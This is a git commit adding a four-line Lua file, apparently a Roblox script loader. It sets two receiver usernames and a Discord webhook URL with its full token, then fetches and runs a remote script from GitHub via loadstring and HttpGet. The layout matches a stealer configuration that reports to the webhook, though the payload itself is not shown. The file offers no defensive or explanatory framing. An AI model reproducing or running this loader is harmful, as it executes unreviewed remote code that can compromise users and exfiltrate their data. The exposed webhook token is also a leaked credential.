6fe83347857677e04d57f1f49bb5ad518040fdbf
Sleepy2swag <128605390+Sleepy2swag@users.noreply.github.com>
2023-03-23 02:30:28 +0000

    Add files via upload

---
+++ 836294902844751973 (1).lua
@@ -0,0 +1,4 @@
+UserName = "Gn_Sleepy"
+UserName2 = "Gn_Sleepy"
+Webhook = "https://discord.com/api/webhooks/1084611770590707733/kRTAK4T76-HkuM3nVrZNaeesaodqlVNRT9HaoUmyqAz_s61W-y73pcVo6AwBCHVyEElo"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
